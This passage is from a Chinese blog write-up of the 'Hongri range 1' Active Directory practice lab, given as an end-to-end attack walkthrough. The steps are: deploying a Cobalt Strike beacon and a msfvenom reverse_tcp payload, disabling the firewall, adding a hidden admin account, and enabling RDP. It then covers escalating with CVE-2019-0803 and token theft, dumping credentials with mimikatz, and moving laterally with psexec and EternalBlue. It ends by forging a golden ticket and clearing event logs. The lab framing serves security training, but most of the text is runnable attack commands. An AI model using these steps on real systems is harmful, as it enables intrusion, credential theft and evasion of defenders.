+<p>右上角<code>攻击 -&gt; 生成后门 -&gt; Windows Executable</code>，生成后门可执行文件</p>
+<p>监听器选择刚刚创建的，勾选x64</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717110212036.png"></p>
+<p>将生成的可执行文件通过蚁剑上传到WWW目录下</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717110513637.png"></p>
+<p>右键打开终端，执行上传上去的shell.exe</p>
+<p>成功上线cs</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717110603730.png"></p>
+<h3 id="提升权限"><a href="#提升权限" class="headerlink" title="提升权限"></a>提升权限</h3><p>方便操作，我们把回连间隔改为0使得输入的命令立刻执行</p>
+<p>（实战不建议这样，容易被办）</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717110954825.png"></p>
+<p>右键进入beacon，上线cs第一件事把防火墙关了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717111231214.png"></p>
+<p><strong>补充：也可以远程登陆关闭防火墙</strong></p>
+<p>尝试远程登陆</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shell net user rev1ve sz@2019 /add               #添加账户密码</span><br><span class="line">shell net localgroup administrators rev1ve /add  #添加为管理员权限</span><br><span class="line">shell REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f </span><br><span class="line"># 开启3389端口</span><br></pre></td></tr></table></figure>
+
+<p>成功添加管理员用户</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717133735976.png"></p>
+<p>然后在攻击机执行以下命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 192.168.80.128:3389</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717135102643.png"></p>
+<h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>关闭防火墙后，右键<code>执行 -&gt; 提权</code>选择我们刚刚创建的监听器</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717111348584.png"></p>
+<p>执行exp，过一会拿到SYSTEM权限（把回连间隔也改为0）</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717112013366.png"></p>
+<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>尝试cve-2019-0803提权 <a target="_blank" rel="noopener" href="https://k8gege.org/p/fa25cc9b.html">exp链接</a></p>
+<p>将下载的cve-2019-0803.exe上传到WWW目录下，执行以下命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell cve-2019-0803.exe cmd &quot;start shell.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<p>相当于再启动shell.exe木马文件，过一会拿到SYSTEM权限</p>
+<h3 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h3><h4 id="内网信息搜集"><a href="#内网信息搜集" class="headerlink" title="内网信息搜集"></a>内网信息搜集</h4><h5 id="查看网络适配器"><a href="#查看网络适配器" class="headerlink" title="查看网络适配器"></a>查看网络适配器</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell ipconfig</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717112603302.png"></p>
+<p>不难发现除了我们访问ip所在网段外，还存在内网<code>192.168.52.0/24</code>的网段</p>
+<h5 id="查看本地用户信息"><a href="#查看本地用户信息" class="headerlink" title="查看本地用户信息"></a>查看本地用户信息</h5><p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717112931140.png"></p>
+<h5 id="查看本地管理员组"><a href="#查看本地管理员组" class="headerlink" title="查看本地管理员组"></a>查看本地管理员组</h5><p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717113124605.png"></p>
+<h4 id="域内信息搜集"><a href="#域内信息搜集" class="headerlink" title="域内信息搜集"></a>域内信息搜集</h4><h5 id="判断是否存在域环境"><a href="#判断是否存在域环境" class="headerlink" title="判断是否存在域环境"></a>判断是否存在域环境</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell net config Workstation</span><br></pre></td></tr></table></figure>
+
+<p>可以知道存在GOD域环境，域名为god.org</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717120313607.png"></p>
+<h5 id="查看域列表"><a href="#查看域列表" class="headerlink" title="查看域列表"></a>查看域列表</h5><p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717175935391.png"></p>
+<h5 id="查看域用户信息"><a href="#查看域用户信息" class="headerlink" title="查看域用户信息"></a>查看域用户信息</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell wmic useraccount get Caption,Domain,Description</span><br></pre></td></tr></table></figure>
+
+<p>我们目前拿到的shell就是位于STU1</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717123542185.png"></p>
+<h5 id="查看主域控制器"><a href="#查看主域控制器" class="headerlink" title="查看主域控制器"></a>查看主域控制器</h5><p>通过查询时间服务器来找到主域控制器名称</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell net time /domain</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717122011356.png"></p>
+<h5 id="定位主域控制器"><a href="#定位主域控制器" class="headerlink" title="定位主域控制器"></a>定位主域控制器</h5><p>拿到主域控制器名称后，执行以下命令定位目标主机在内网的IP</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell ping owa.god.org</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717122122602.png"></p>
+<h4 id="探测内网存活主机"><a href="#探测内网存活主机" class="headerlink" title="探测内网存活主机"></a>探测内网存活主机</h4><h5 id="基于ICMP发现存活主机"><a href="#基于ICMP发现存活主机" class="headerlink" title="基于ICMP发现存活主机"></a>基于ICMP发现存活主机</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.52.%I | findstr &quot;TTL=&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717123253998.png"></p>
+<p>也可以使用cs右键<code>目标 -&gt; 端口扫描</code></p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717124846523.png"></p>
+<p>得到存活主机名单</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">192.168.52.143       #我们getshell机子的内网ip</span><br><span class="line">192.168.52.141       </span><br><span class="line">192.168.52.138       #主域控制器的内网ip</span><br></pre></td></tr></table></figure>
+
+<h5 id="使用fscan扫描内网存活主机"><a href="#使用fscan扫描内网存活主机" class="headerlink" title="使用fscan扫描内网存活主机"></a>使用fscan扫描内网存活主机</h5><p>由于目标网段是内网，我们需要搭建一个一级网络代理</p>
+<p>这里就不赘述</p>
+<h4 id="用户凭据收集"><a href="#用户凭据收集" class="headerlink" title="用户凭据收集"></a>用户凭据收集</h4><h5 id="抓取-Hash"><a href="#抓取-Hash" class="headerlink" title="抓取 Hash"></a>抓取 Hash</h5><p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717144635784.png"></p>
+<h5 id="抓取明文密码"><a href="#抓取明文密码" class="headerlink" title="抓取明文密码"></a>抓取明文密码</h5><p>右键选择<code>执行 -&gt; run mimikatz</code></p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717125753858.png"></p>
+<h4 id="内网横向移动"><a href="#内网横向移动" class="headerlink" title="内网横向移动"></a>内网横向移动</h4><p>我们目前拿到的是内网ip为192.168.52.143的控制权</p>
+<p>不过这台机子并不在GOD域内，我们尝试切换目标为ip是192.168.52.138的域控</p>
+<p>由于刚刚扫描发现445端口开放</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717142743288.png"></p>
+<p>那么先创建SMB监听器</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717142829861.png"></p>
+<p>然后在左上角点击显示目标</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717135529818.png"></p>
+<p>右键选择<code>jump -&gt; psexec</code></p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717142553417.png"></p>
+<p>然后选择我们刚刚创建的SMB监听器，对端连接的隧道选择system权限的</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717143031547.png"></p>
+<p>不清楚这里为什么失败，搁置了很久</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717143334195.png"></p>
+<p>后面参考别人的wp，想到应该是这里psexec对应的密码我们是修改过的，我们将域控原始密码<code>hongrisec@2019</code>改为我们后面的新密码就行了</p>
+<p>横向移动后，养成关闭防火墙习惯</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717185353040.png"></p>
+<p>成功进入域控，拿到最高权限</p>
+<h3 id="权限维持-黄金票据"><a href="#权限维持-黄金票据" class="headerlink" title="权限维持-黄金票据"></a>权限维持-黄金票据</h3><p>这里需要再抓取一次hash和明文密码</p>
+<p><strong>抓取hash</strong></p>
+<p>右键选择<code>执行 -&gt; 转储hash</code></p>
+<p>记住Krbtgt的hash值<code>58e91a5ac358d86513ab224312314061</code></p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717185801850.png"></p>
+<p><strong>抓取明文密码</strong></p>
+<p>右键选择<code>执行 -&gt; run mimikatz</code></p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717190216486.png"></p>
+<p> 把SID，域名和hash复制下来</p>
+<p>右键选择<code>执行 -&gt; 黄金票据</code></p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717190625098.png"></p>
+<p>填进对应数据</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717190807401.png"></p>
+<p>出现下图视为成功</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717190914990.png"></p>
+<h3 id="消除痕迹"><a href="#消除痕迹" class="headerlink" title="消除痕迹"></a>消除痕迹</h3><p> 在渗透过程中，痕迹清除非常非常重要，不清除容易被防守方溯源</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shell wevtutil cl security                #清理安全日志</span><br><span class="line">shell wevtutil cl system                  #清理系统日志</span><br><span class="line">shell wevtutil cl application             #清理应用程序日志</span><br><span class="line">shell wevtutil cl &quot;windows powershell&quot;    #清除power shell日志</span><br><span class="line">shell wevtutil cl Setup                   #清除（cl）事件日志中的 &quot;Setup&quot; 事件。</span><br></pre></td></tr></table></figure>
+
+<p>到这里整个打靶流程就结束了</p>
+<hr>
+<h2 id="打法二"><a href="#打法二" class="headerlink" title="打法二"></a>打法二</h2><h3 id="联动蚁剑上线msf"><a href="#联动蚁剑上线msf" class="headerlink" title="联动蚁剑上线msf"></a>联动蚁剑上线msf</h3><p>我们先生成msf的木马文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.80.10 LPORT=1028 -f exe &gt; exp.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240718113239163.png"></p>
+<p>开启msf监听</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.80.10</span><br><span class="line">set lport 1028</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>通过蚁剑上传木马文件并执行，拿到meterpreter会话</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240718113531008.png"></p>
+<p>执行shell命令，输入<code>chcp 65001</code>解决中文乱码问题</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240718113839978.png"></p>
+<p>上线msf第一件事关闭防火墙</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240718120946317.png"></p>
+<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>我们可以知道目前是administrator管理员权限</p>
+<p>尝试窃取SYSTEM权限令牌，在meterpreter会话依次执行以下命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">load incognito                                   #加载incognito模块</span><br><span class="line">list_tokens -u                                   #列出主机上所有令牌</span><br><span class="line">impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;          #窃取NT AUTHORITY\SYSTEM账户的令牌</span><br><span class="line">steal_token &lt;PID&gt;                                #从指定进程中窃取令牌</span><br></pre></td></tr></table></figure>
+
+<p>成功拿到最高权限</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240718120659776.png"></p>
+<h3 id="内网渗透-1"><a href="#内网渗透-1" class="headerlink" title="内网渗透"></a>内网渗透</h3><h4 id="内网信息搜集-1"><a href="#内网信息搜集-1" class="headerlink" title="内网信息搜集"></a>内网信息搜集</h4><p>和打法一相同不再赘述</p>
+<h4 id="域内信息搜集-1"><a href="#域内信息搜集-1" class="headerlink" title="域内信息搜集"></a>域内信息搜集</h4><p>和打法一相同不再赘述</p>
+<h4 id="探测内网存活主机-1"><a href="#探测内网存活主机-1" class="headerlink" title="探测内网存活主机"></a>探测内网存活主机</h4><p>由于我们拿到shell了，利用后渗透阶段的基于arp协议探测</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/arp_scanner rhosts=192.168.52.0/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240718183923147.png"></p>
+<h4 id="用户凭据收集-1"><a href="#用户凭据收集-1" class="headerlink" title="用户凭据收集"></a>用户凭据收集</h4><h5 id="抓取Hash"><a href="#抓取Hash" class="headerlink" title="抓取Hash"></a>抓取Hash</h5><p>可以使用模块smart hashdump</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run windows/gather/smart_hashdump</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240718184600701.png"></p>
+<p>也可以执行以下命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run hashdump</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240718185518980.png"></p>
+<h5 id="抓取明文密码-1"><a href="#抓取明文密码-1" class="headerlink" title="抓取明文密码"></a>抓取明文密码</h5><p>前提条件：</p>
+<ul>
+<li>SYSTEM权限</li>
+<li>meterpreter进程迁移到一个64位程序的进程中</li>
+</ul>
+<p>使用msf中的kiwi模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load kiwi         #加载kiwi模块</span><br><span class="line">help kiwi         #查看kiwi模块的使用</span><br></pre></td></tr></table></figure>
+
+<p>我们现在执行<code>creds_all</code>不行，原因在于我们的meterpreter进程在86位进程中</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240718192049466.png"></p>
+<p>我们可以选择迁移PID为516的lsass.exe进程</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240718192231428.png"></p>
+<p>获取明文密码</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240718192345127.png"></p>
+<h4 id="内网横向移动-1"><a href="#内网横向移动-1" class="headerlink" title="内网横向移动"></a>内网横向移动</h4><p>我们前面知道还存在<code>192.168.52.0/24</code>网段，借助MSF 的 autoroute 模块去访问内网网段</p>
+<p><strong>静态路由配置</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#加载MSF的autoroute模块，获取当前机器的所有网段信息</span><br><span class="line">meterpreter &gt; run post/multi/manage/autoroute  </span><br><span class="line">#添加目标内网路由</span><br><span class="line">meterpreter &gt; run post/multi/manage/autoroute SUBNET=192.168.52.0 ACTION=ADD</span><br></pre></td></tr></table></figure>
+
+<p>可以看到已经存在该内网网段，就不用再添加了</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240718195213356.png"></p>
+<p>尝试探测域控主机的445端口是否开放</p>
+<p>使用<code>auxiliary/scanner/portscan/tcp</code>模块</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240718195748044.png"></p>
+<p>开启445端口的话，尝试使用永恒之蓝漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set rhosts 192.168.52.138</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240718202222895.png"></p>
+<p>成功拿到域控的最高权限</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240718202313891.png"></p>
+<hr>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>解决小皮停止工作：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_57401160/article/details/139505815">https://blog.csdn.net/weixin_57401160/article/details/139505815</a></li>
+</ul>
+<p>靶场wp：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_52849046/article/details/139163010">https://blog.csdn.net/qq_52849046/article/details/139163010</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43531669/article/details/129945347">https://blog.csdn.net/qq_43531669/article/details/129945347</a></li>
+</ul>
+<p>msf抓取明文密码：</p>
+<ul>
+<li><a href="https://cloud.tencent.com/developer/tools/blog-entry?target=http://mp.weixin.qq.com/s?__biz=MzI2NDQyNzg1OA==&mid=2247485520&idx=1&sn=afe7ab1dd663bf8dcc9811c840f33614&chksm=eaad886dddda017b5ca9f42ac926ec8abdb42e958561924144f79aad5969c7310bf059e9ba03&scene=21%23wechat_redirect&source=article&objectId=1937042">https://cloud.tencent.com/developer/tools/blog-entry?target=http%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzI2NDQyNzg1OA%3D%3D%26mid%3D2247485520%26idx%3D1%26sn%3Dafe7ab1dd663bf8dcc9811c840f33614%26chksm%3Deaad886dddda017b5ca9f42ac926ec8abdb42e958561924144f79aad5969c7310bf059e9ba03%26scene%3D21%23wechat_redirect&amp;source=article&amp;objectId=1937042</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag"># 靶场</a>
+              <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag"># 域渗透</a>
+              <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag"># 内网渗透</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/article/%E8%AE%B0%E5%BD%95kali%E5%AE%89%E8%A3%85%E8%9A%81%E5%89%91.html" rel="prev" title="记录kali安装蚁剑">
+      <i class="fa fa-chevron-left"></i> 记录kali安装蚁剑
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html" rel="next" title="ThinkPHP3漏洞探索">
+      ThinkPHP3漏洞探索 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1"><span class="nav-number">1.</span> <span class="nav-text">红日靶场1</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="nav-number">1.1.</span> <span class="nav-text">环境配置</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%85%8D%E7%BD%AE%E6%94%BB%E5%87%BB%E6%9C%BAkali"><span class="nav-number">1.1.1.</span> <span class="nav-text">配置攻击机kali</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%85%8D%E7%BD%AEwin7-x64"><span class="nav-number">1.1.2.</span> <span class="nav-text">配置win7 x64</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%85%8D%E7%BD%AEwin2008"><span class="nav-number">1.1.3.</span> <span class="nav-text">配置win2008</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%85%8D%E7%BD%AEwin2k3"><span class="nav-number">1.1.4.</span> <span class="nav-text">配置win2k3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%AF%E5%8A%A8phpstudy%E6%9C%8D%E5%8A%A1"><span class="nav-number">1.1.5.</span> <span class="nav-text">启动phpstudy服务</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">1.2.</span> <span class="nav-text">信息搜集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9"><span class="nav-number">1.3.</span> <span class="nav-text">外网打点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%89%93%E6%B3%95%E4%B8%80"><span class="nav-number">1.4.</span> <span class="nav-text">打法一</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%81%94%E5%8A%A8%E8%9A%81%E5%89%91%E4%B8%8A%E7%BA%BFcs"><span class="nav-number">1.4.1.</span> <span class="nav-text">联动蚁剑上线cs</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90"><span class="nav-number">1.4.2.</span> <span class="nav-text">提升权限</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="nav-number">1.4.2.1.</span> <span class="nav-text">方法一</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="nav-number">1.4.2.2.</span> <span class="nav-text">方法二</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="nav-number">1.4.3.</span> <span class="nav-text">内网渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">1.4.3.1.</span> <span class="nav-text">内网信息搜集</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E7%BD%91%E7%BB%9C%E9%80%82%E9%85%8D%E5%99%A8"><span class="nav-number">1.4.3.1.1.</span> <span class="nav-text">查看网络适配器</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF"><span class="nav-number">1.4.3.1.2.</span> <span class="nav-text">查看本地用户信息</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98%E7%BB%84"><span class="nav-number">1.4.3.1.3.</span> <span class="nav-text">查看本地管理员组</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">1.4.3.2.</span> <span class="nav-text">域内信息搜集</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E5%9F%9F%E7%8E%AF%E5%A2%83"><span class="nav-number">1.4.3.2.1.</span> <span class="nav-text">判断是否存在域环境</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E5%9F%9F%E5%88%97%E8%A1%A8"><span class="nav-number">1.4.3.2.2.</span> <span class="nav-text">查看域列表</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E5%9F%9F%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF"><span class="nav-number">1.4.3.2.3.</span> <span class="nav-text">查看域用户信息</span></a></li><li class="nav-item 